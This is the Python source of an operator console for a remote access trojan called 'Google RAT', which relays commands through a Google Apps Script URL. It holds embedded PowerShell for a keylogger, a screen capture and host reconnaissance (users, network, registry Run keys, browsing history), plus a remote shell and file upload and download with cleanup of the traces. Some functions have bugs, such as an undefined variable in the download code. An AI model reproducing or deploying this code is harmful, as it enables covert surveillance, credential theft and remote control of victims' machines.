import os
import base64
import logging
import requests
import argparse
import subprocess
import multiprocessing.dummy

CMD_ID = '@'
UPLOAD_ID = '^'
CHUNK_SIZE = 35000   # 35 KB
SIZE_LIMIT = 8500000 # 8.5 MB
LOG_FORMAT = '[%(asctime)s][%(levelname)s] %(message)s'
BANNER = """
*******************************************************************************
Google RAT v1.0
*******************************************************************************
# view help:
python script.py -h
# connect to server
python script.py https://script.google.com/macros/s/dfjlksdf/exec
*******************************************************************************
"""

class Shell(object):
  BANNER = """
          ___
    . -^   `--,
   /# =========`-_       +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
  /# (--====___====\     |S|H|O|W| |M|E| |W|H|A|T| |Y|O|U| |G|O|T|
 /#   .- --.  . --.|     +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
/##   |  * ) (   * ),                   Author: Mr. Poopy Butthole
|##   \    /\ \   / |
|###   ---   \ ---  |
|####      ___)    #|    Type 'help' for a list of commands
|######           ##|
 \##### ---------- /
  \####           (
   `\###          |
     \###         |
      \##        |
       \###.    .)
        `======/
  """
  SCREENSHOT_SCRIPT = r"""
  [System.Reflection.Assembly]::LoadWithPartialName('System.Drawing') | out-null;
  [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | out-null;
  $d = (Get-ItemProperty 'HKCU:\Control Panel\Desktop\WindowMetrics' -Name AppliedDPI).AppliedDPI;
  switch ($d) {
    96  {$d = 100};
    120 {$d = 125};
    144 {$d = 150};
    168 {$d = 175};
    192 {$d = 200};
    216 {$d = 225};
    240 {$d = 250};
    default {$d = 100};
  }
  $s = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize;
  $w = [int][Math]::Floor((($s.width) / 100) * $d);
  $h = [int][Math]::Floor((($s.height) / 100) * $d);
  $b = New-Object System.Drawing.Bitmap($w, $h);
  $g = [System.Drawing.Graphics]::FromImage($b);
  $g.CopyFromScreen((New-Object System.Drawing.Point(0,0)),(New-Object System.Drawing.Point(0,0)),$b.Size);
  $g.Dispose();
  $b.Save('_.jpeg', ([system.drawing.imaging.imageformat]::Jpeg));
  Get-ItemProperty '_.jpeg';
  """
  KEYLOGGER_SCRIPT = r"""
  $i = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode);';
  $a = Add-Type -MemberDefinition $i -Name 'Win32' -Namespace API -PassThru;
  $t = new-timespan -Minutes 1;
  $w = [diagnostics.stopwatch]::StartNew();
  $l = New-Object System.Collections.ArrayList;
  while ($w.elapsed -lt $t) {
    Start-Sleep -m 50;
    for ($c = 32; $c -le 126; $c++) {
      if ($a::GetAsyncKeyState($c) -eq -32767) {
        $l.Add([System.Convert]::ToChar($c)) | out-null;
      }
    }
  }
  $l -join '' | out-file '_.txt';
  Get-ItemProperty '_.txt';
  """
  INFO_SCRIPT = r"""
  date;
  whoami;
  ipconfig /all;
  systeminfo;
  get-childitem "\\$env:COMPUTERNAME\c$\Users" | sort-object LastWriteTime -Descending | select-object Name;
  net user;
  net localgroup;
  net localgroup administrators;
  get-process;
  get-service | Sort-Object -Property Status,Name;
  netstat -ano;
  route print;
  ipconfig /displaydns;
  arp -a;
  netsh wlan show networks;
  net share;
  netsh advfirewall show allprofiles;
  reg query 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run';
  reg query 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce';
  reg query 'HKCU\Software\Microsoft\Internet Explorer';
  reg query 'HKCU\Software\Microsoft\Internet Explorer\Main' /v 'Start Page' /t REG_SZ;
  reg query 'HKCU\Software\Microsoft\Internet Explorer\TypedURLs';
  """

  def __init__(self, srv):
    self.srv = srv
    self.hosts = []
    logging.info('connecting to {}'.format(self.srv))
    r = requests.get(args.srv)
    if r.status_code != requests.codes.ok:
      logging.error('server not responding. response: {0}'.format(r.status_code))
    else:
      logging.info('success. server is up!')
    print(self.BANNER)

  def __e(self, d):
    return base64.b64encode(d.encode('UTF-8')).decode('UTF-8')

  def __u(self, ip):
    if ip in [d['ip'] for d in self.hosts]:
      return [d['user'] for d in self.hosts if d['ip'] == ip][0]
    else:
      return ''

  def __r(self, ip, user, d, d_type):
    if len(d) > SIZE_LIMIT:
      logging.error('data size {0}B is beyond size limit of {1}B'.format(len(d), SIZE_LIMIT))
      return ''
    key = ''.join([user, '@', ip])
    s = ip + '|' + user
    dx = base64.b64encode(d).decode('UTF-8')
    # wait to send data
    logging.info('[{0}] (1/6) waiting on TxR = 0 ...'.format(key))
    while True:
      r = requests.get(self.srv, params={'TxR': '{0}'.format(self.__e(s))})
      if r.status_code != requests.codes.ok:
        logging.error('[{0}] TxR GET request failed: {1}'.format(key, r.status_code))
        return ''
      logging.debug('[{0}] TxR: {1}'.format(key, r.content.decode('UTF-8')))
      if r.content.decode('UTF-8') == '0':
        break
    # send data
    logging.info('[{0}] (2/6) sending Tx data ...'.format(key))
    col = 3
    for i in range(0, len(dx), CHUNK_SIZE):
      r = requests.post(self.srv, params={'Tx': '{0}'.format(self.__e(''.join([s, '|', str(col)])))}, data={'d': dx[i:i+CHUNK_SIZE]})
      if r.status_code != requests.codes.ok:
        logging.error('[{0}] Tx POST request failed: {1}'.format(key, r.status_code))
        return ''
      logging.debug('[{0}] TxD[{1}]: {2}'.format(key, col - 3, dx[i:i+CHUNK_SIZE]))
      col = col + 1
    # set data type
    logging.info('[{0}] (3/6) setting TxR = {1} ...'.format(key, d_type))
    r = requests.post(self.srv, params={'Tx': '{0}'.format(self.__e(''.join([s, '|2'])))}, data={'d': d_type})
    if r.status_code != requests.codes.ok:
      logging.error('[{0}] Tx POST request failed: {1}'.format(key, r.status_code))
      return ''
    # wait to get data
    logging.info('[{0}] (4/6) waiting on RxR = 1 ...'.format(key))
    while True:
      r = requests.get(self.srv, params={'RxR': '{0}'.format(self.__e(s))})
      if r.status_code != requests.codes.ok:
        logging.error('[{0}] RxR GET request failed: {1}'.format(key, r.status_code))
        return ''
      logging.debug('[{0}] RxR: {1}'.format(key, r.content.decode('UTF-8')))
      if r.content.decode('UTF-8') == '1':
        break
    # download data
    col = 3
    buf = []
    logging.info('[{0}] (5/6) downloading Rx data ...'.format(key))
    while True:
      r = requests.get(self.srv, params={'RxD': '{0}'.format(self.__e(''.join([s, '|', str(col)])))})
      if r.status_code != requests.codes.ok:
        logging.error('[{0}] RxD GET request failed: {1}'.format(key, r.status_code))
        return ''
      if r.content.decode('UTF-8') == '':
        break
      logging.debug('[{0}] RxD[{1}]: {2}'.format(key, col - 3, r.content.decode('UTF-8')))
      buf.append(r.content.decode('UTF-8'))
      col = col + 1
    # ACK download of data
    logging.info('[{0}] (6/6) setting RxR = 0 ...'.format(key))
    r = requests.post(self.srv, params={'Rx': '{0}'.format(self.__e(''.join([s, '|2'])))}, data={'d': '0'})
    if r.status_code != requests.codes.ok:
      logging.error('[{0}] Rx POST request failed: {1}'.format(key, r.status_code))
      return ''
    # return array of chunked data
    return buf

  def help(self):
    print('ls                     - list all active clients')
    print('run        <cmd>       - run command locally')
    print('screenshot <ip>        - capture screen on <ip> or all')
    print('keylogger  <ip>        - capture ASCII keystrokes on <ip> or all for 1 minute')
    print('info       <ip>        - gather basic info about <ip> or all')
    print('shell      <ip>        - run powershell commands on <ip>')
    print('upload     <ip> <file> - upload local <file> to <ip> or all')
    print('download   <ip> <file> - download remote <file> from <ip> or all')
    print('quit                   - exit')

  def thread(self, f, ip, d):
    if ip != 'all':
      f({'ip':ip,'args':d})
      return
    # identify targets
    hosts = self.ls()
    # spawn threads for request
    threads = multiprocessing.dummy.Pool(len(hosts))
    r = threads.map(f, [{'ip':h['ip'],'args':d} for h in hosts])
    print('DONE')

  def ls(self):
    r = requests.get(self.srv, params={'ls': ''})
    if r.status_code != requests.codes.ok:
      logging.error('failed to execute "ls" command. response: {0}'.format(r.status_code))
    else:
      hosts = []
      raw = r.content.decode('UTF-8').split('|')
      for ip,user in zip(raw[0::2], raw[1::2]):
        if ip and user:
          hosts.append({'ip': ip, 'user': user})
          logging.info('client found: {0}@{1}'.format(user, ip))
      if not hosts:
        logging.info('no hosts found')
      self.hosts = hosts
    return self.hosts

  def run(self, cmd):
    try:
      print(subprocess.check_output(cmd.split(' ')).decode('UTF-8'))
    except:
      logging.error('failed to run command: {0}'.format(cmd))

  def shell(self, d):
    logging.info('enter "quit" to exit shell')
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(d['ip'])
    if not user:
      logging.error('invalid ip: {0}'.format(d['ip']))
      return
    while True:
      cmd = input('{0}@{1} PS> '.format(user, d['ip'])).lower()
      if cmd in ['e', 'q', 'exit', 'quit']:
        logging.info('exiting shell on {0}'.format(d['ip']))
        break
      if cmd.strip():
        r = self.__r(d['ip'], user, cmd.encode('UTF-16LE'), CMD_ID)
        print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))

  def upload(self, d):
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(d['ip'])
    if not user:
      logging.error('invalid ip: {0}'.format(d['ip']))
      return
    key = ''.join([user, '@', d['ip']])
    try:
      with open(d['args']['path'], 'rb') as f:
        r = self.__r(d['ip'], user, f.read(), os.path.basename(d['args']['path']))
        print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
      print('[{0}] SUCCESS - uploaded file {1}'.format(key, d['args']['path']))
    except:
      logging.error('[{0}] failed to send file: {1}'.format(key, d['args']['path']))

  def download(self, d):
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(d['ip'])
    if not user:
      logging.error('invalid ip: {0}'.format(d['ip']))
      return
    key = ''.join([user, '@', d['ip']])
    try:
      filename = ''.join([user, '-', d['ip'], '-', d['args']['path']])
      with open(filename, 'wb') as f:
        r = self.__r(d['ip'], user, path.encode('UTF-8'), UPLOAD_ID)
        f.write(b''.join([base64.b64decode(c) for c in r]))
      print('[{0}] SUCCESS - downloaded file {1} as {2}'.format(key, d['args']['path'], filename))
    except:
      logging.error('[{0}] failed to download file {1} as {2}'.format(key, d['args']['path'], filename))

  def screenshot(self, d):
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(d['ip'])
    if not user:
      logging.error('invalid ip: {0}'.format(d['ip']))
      return
    key = ''.join([user, '@', d['ip']])
    # run script to make screenshot
    logging.info('[{0}] generating screenshot file _.jpeg ...'.format(key))
    try:
      r = self.__r(d['ip'], user, self.SCREENSHOT_SCRIPT.encode('UTF-16LE'), CMD_ID)
      print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
    except:
      logging.error('[{0}] failed to run screenshot script: {1}'.format(key, self.SCREENSHOT_SCRIPT))
    # download screenshot
    logging.info('[{0}] downloading screenshot file _.jpeg ...'.format(key))
    try:
      self.download(d['ip'], '_.jpeg')
    except:
      logging.error('[{0}] failed to download screenshot file: _.jpeg'.format(key))
    # delete screenshot file
    logging.info('[{0}] deleting screenshot file _.jpeg ...'.format(key))
    try:
      r = self.__r(d['ip'], user, 'del _.jpeg'.encode('UTF-16LE'), CMD_ID)
      print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
    except:
      logging.error('[{0}] failed to delete screenshot file _.jpeg'.format(key))
    print('[{0}] SUCCESS - downloaded file _.jpeg'.format(key))

  def keylogger(self, d):
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(d['ip'])
    if not user:
      logging.error('invalid ip: {0}'.format(d['ip']))
      return
    key = ''.join([user, '@', d['ip']])
    # run script to make log
    logging.info('[{0}] running keylogger for 1 minute ...'.format(key))
    try:
      r = self.__r(d['ip'], user, self.KEYLOGGER_SCRIPT.encode('UTF-16LE'), CMD_ID)
      print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
    except:
      logging.error('[{0}] failed to run keylogger script: {1}'.format(key, self.KEYLOGGER_SCRIPT))
    # download log
    logging.info('[{0}] downloading keylogger file _.txt ...'.format(key))
    try:
      self.download(d['ip'], '_.txt')
    except:
      logging.error('[{0}] failed to download keylogger file: _.txt'.format(key))
    # delete keylogger file
    logging.info('[{0}] deleting keylogger file _.txt ...'.format(key))
    try:
      r = self.__r(d['ip'], user, 'del _.txt'.encode('UTF-16LE'), CMD_ID)
      print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
    except:
      logging.error('[{0}] failed to delete keylogger file _.txt'.format(key))
    print('[{0}] SUCCESS - downloaded file _.txt'.format(key))

  def info(self, d):
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(d['ip'])
    if not user:
      logging.error('invalid ip: {0}'.format(d['ip']))
      return
    key = ''.join([user, '@', d['ip']])
    # run script to make log
    logging.info('[{0}] gathering info ...'.format(key))
    try:
      r = self.__r(d['ip'], user, self.INFO_SCRIPT.encode('UTF-16LE'), CMD_ID)
      print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
    except:
      logging.error('[{0}] failed to run info script: {0}'.format(key, self.INFO_SCRIPT))


if __name__ == '__main__':
  # parse user arguments
  parser = argparse.ArgumentParser(usage=BANNER)
  parser.add_argument('srv', help='google apps server URL', type=str)
  parser.add_argument('-l', dest='logging_level', default='INFO', help='logging level for output', type=str)
  args = parser.parse_args()
  # setup logger
  logging.basicConfig(format=LOG_FORMAT, datefmt='%d %b %Y %H:%M:%S', level=args.logging_level)
  # create user shell
  sh = Shell(args.srv)
  # accept user input for hosts
  while True:
    c = input('> ').lower()
    if c == 'help':
      sh.help()
    if c == 'ls':
      sh.ls()
    if c.startswith('run'):
      sh.run(c.replace('run', '').strip())
    if c.startswith('shell'):
      sh_args = c.replace('shell', '').strip().split(' ')
      if len(sh_args) != 1:
        logging.error('invalid arguments. run "help"')
        continue
      sh.thread(sh.shell, sh_args[0], {})
    if c.startswith('info'):
      sh_args = c.replace('info', '').strip().split(' ')
      if len(sh_args) != 1:
        logging.error('invalid arguments. run "help"')
        continue
      sh.thread(sh.info, sh_args[0], {})
    if c.startswith('screenshot'):
      sh_args = c.replace('screenshot', '').strip().split(' ')
      if len(sh_args) != 1:
        logging.error('invalid arguments. run "help"')
        continue
      sh.thread(sh.screenshot, sh_args[0], {})
    if c.startswith('keylogger'):
      sh_args = c.replace('keylogger', '').strip().split(' ')
      if len(sh_args) != 1:
        logging.error('invalid arguments. run "help"')
        continue
      sh.thread(sh.keylogger, sh_args[0], {})
    if c.startswith('upload'):
      sh_args = c.replace('upload', '').strip().split(' ')
      if len(sh_args) != 2:
        logging.error('invalid arguments. run "help"')
        continue
      sh.thread(sh.upload, sh_args[0], {'path':sh_args[1]})
    if c.startswith('download'):
      sh_args = c.replace('download', '').strip().split(' ')
      if len(sh_args) != 2:
        logging.error('invalid arguments. run "help"')
        continue
      sh.thread(sh.download, sh_args[0], {'path':sh_args[1]})
    if c in ['e', 'q', 'exit', 'quit']:
      break
